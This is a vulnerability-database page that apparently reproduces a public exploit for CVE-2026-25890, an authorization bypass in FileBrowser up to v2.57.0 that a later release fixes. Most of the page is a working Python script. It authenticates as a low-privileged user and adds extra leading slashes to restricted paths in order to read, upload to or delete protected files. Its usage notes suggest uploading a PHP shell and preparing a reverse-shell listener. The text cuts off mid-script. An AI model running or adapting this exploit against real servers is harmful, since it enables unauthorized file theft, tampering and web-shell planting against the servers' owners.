---
title: FileBrowser ≤ v2.57.0 - Path-Based Access Control Bypass via Multiple Leading Slashes in URL (Authenticated Authorization Byp
url: https://cxsecurity.com/issue/WLB-2026020025
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-23
fetch_date: 2026-02-24T04:11:32.673432
---

# FileBrowser ≤ v2.57.0 - Path-Based Access Control Bypass via Multiple Leading Slashes in URL (Authenticated Authorization Byp

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **FileBrowser ≤ v2.57.0 - Path-Based Access Control Bypass via Multiple Leading Slashes in URL (Authenticated Authorization Bypass)** **2026.02.23**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-25890](https://cxsecurity.com/cveshow/CVE-2026-25890/ "Click to see CVE-2026-25890")**  CWE: **N/A** | |

#!/usr/bin/env python3
# Exploit Title: FileBrowser Access Control Bypass via Multiple Leading Slashes
# CVE: CVE-2026-25890
# Date: 2026-02-20
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub:
# Vendor Homepage: https://filebrowser.org
# Software Link: https://github.com/filebrowser/filebrowser
# Vulnerable: FileBrowser ≤ v2.57.0
# Tested on: Linux / Docker
# Category: Webapps
# Platform: Multi
# Exploit Type: Remote
# Description:
# Exploits path-based access control bypass in FileBrowser ≤ v2.57.0 using
# multiple leading slashes (//private instead of /private) to bypass
# authorization rules that use strings.HasPrefix without path normalization.
# Allows unauthorized read, write and delete operations on restricted paths.
#
# Usage:
# python3 exploit.py --url http://target:8080 --username bob --password pass123 --path /private/secret.txt
#
# Examples:
# python3 exploit.py --url http://192.168.1.50:8080 --username user --password pass --path /private/secret.txt
# python3 exploit.py --url http://10.10.10.123:80 --username alice --password secret --path /data/ --action upload --upload-file shell.php --slashes 3
#
# Options:
# --url Target FileBrowser base URL (required)
# --username Authenticated username (required)
# --password Password for the user (required)
# --path Restricted path/file to target (required)
# --action read | upload | delete (default: read)
# --upload-file Local file to upload when using --action upload
# --slashes Number of leading slashes to use for bypass (default: 2)
# --save Save leaked file to this local path (for read action)
# --verbose Show file content preview when reading
#
# Notes:
# - Requires a valid low-privileged user account that is restricted from the target path
# - Works because Gorilla Mux SkipClean(true) + HasPrefix() check mismatch
# - Fixed in FileBrowser v2.57.1 by removing SkipClean(true)
#
# How to Use
#
# Step 1: Set up listener if using reverse shell payload (not included in this PoC)
# Step 2: Run with appropriate action:
# Read restricted file: --action read
# Upload into restricted dir: --action upload --upload-file malicious.php
# Delete restricted file: --action delete
#
import requests
import argparse
import sys
from requests.auth import HTTPBasicAuth
def print\_banner():
banner = """
╔════════════════════════════════════════════════════════════════════╗
║ ║
║ ███████╗██╗██╗ ███████╗██████╗ ██████╗ ██████╗ ██████╗ ║
║ ██╔════╝██║██║ ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝ ║
║ █████╗ ██║██║ █████╗ ██████╔╝██████╔╝██████╔╝██║ ║
║ ██╔══╝ ██║██║ ██╔══╝ ██╔══██╗██╔══██╗██╔══██╗██║ ║
║ ██║ ██║███████╗███████╗██████╔╝██║ ██║██████╔╝╚██████╗ ║
║ ╚═╝ ╚═╝╚══════╝╚══════╝╚═════╝ ╚═╝ ╚═╝╚═════╝ ╚═════╝ ║
║ ║
║ CVE-2026-25890 FileBrowser Bypass ║
║ Multiple Leading Slashes Authorization Bypass ║
║ ║
║ Author: Mohammed Idrees Banyamer | @banyamer\_security ║
║ Date: 2026-02-20 | Jordan ║
╚════════════════════════════════════════════════════════════════════╝
"""
print(banner)
def test\_vulnerability(session, base\_url, api\_prefix, restricted\_path, slash\_count=2, save\_path=None, verbose=False):
normal\_url = f"{base\_url}{api\_prefix}{restricted\_path}"
print(f"[\*] Testing normal path : {normal\_url}")
r\_normal = session.get(normal\_url)
print(f" Status: {r\_normal.status\_code}")
if r\_normal.status\_code == 403:
print(" → Correctly blocked (expected behavior)")
else:
print(" → Warning: Not blocked — possibly not vulnerable or misconfigured")
bypass\_path = '/' \* slash\_count + restricted\_path.lstrip('/')
bypass\_url = f"{base\_url}{api\_prefix}{bypass\_path}"
print(f"[\*] Testing bypass path ({slash\_count} slashes): {bypass\_url}")
r\_bypass = session.get(bypass\_url)
print(f" Status: {r\_bypass.status\_code}")
if r\_bypass.status\_code == 200:
print(" → BYPASS SUCCESSFUL!")
print(f" Content length: {len(r\_bypass.content)} bytes")
if save\_path:
with open(save\_path, 'wb') as f:
f.write(r\_bypass.content)
print(f" File saved to: {save\_path}")
if verbose:
print(f" Content preview:\n{r\_bypass.text[:400]}...")
else:
print(" → Bypass failed")
def upload\_file(session, base\_url, api\_prefix, restricted\_dir, local\_file, slash\_count=2):
if not restricted\_dir.endswith('/'):
restricted\_dir += '/'
bypass\_dir = '/' \* slash\_count + restricted\_dir.lstrip('/')
filename = local\_file.split('/')[-1]
upload\_url = f"{base\_url}{api\_prefix}{bypass\_dir}{filename}"
print(f"[\*] Attempting upload to: {upload\_url}")
try:
with open(local\_file, 'rb') as f:
files = {'upload': (filename, f)}
r = session.post(upload\_url, files=files)
print(f" Status: {r.status\_code}")
if r.status\_code in [200, 201, 204]:
print(" → UPLOAD BYPASS SUCCESSFUL!")
else:
print(f" → Upload failed ({r.text[:200]}...)")
except FileNotFoundError:
print(f"[!] Local file not found: {local\_file}")
sys.exit(1)
def delete\_file(session, base\_url, api\_prefix, restricted\_path, slash\_count=2):
bypass\_path = '/' \* slash\_count + restricted\_path.lstrip('/')
delete\_url = f"{base\_url}{api\_prefix}{bypass\_path}"
print(f"[\*] Attempting delete: {delete\_url}")
r = session.delete(delete\_url)
print(f" Status: {r.status\_code}")
if r.status\_code in [200, 204]:
print(" → DELETE BYPASS SUCCESSFUL!")
else:
print(f" → Delete failed ({r.text[:200]}...)")
if \_\_name\_\_ == "\_\_main\_\_":
print\_banner()
parser = argparse.ArgumentParser(description="CVE-2026-25890 FileBrowser Access Control Bypass Exploit")
parser.add\_argument("--url", required=True, help="Target base URL[](http://host:port)")
parser.add\_argument("--username", required=True, help="Authenticated username")
parser.add\_...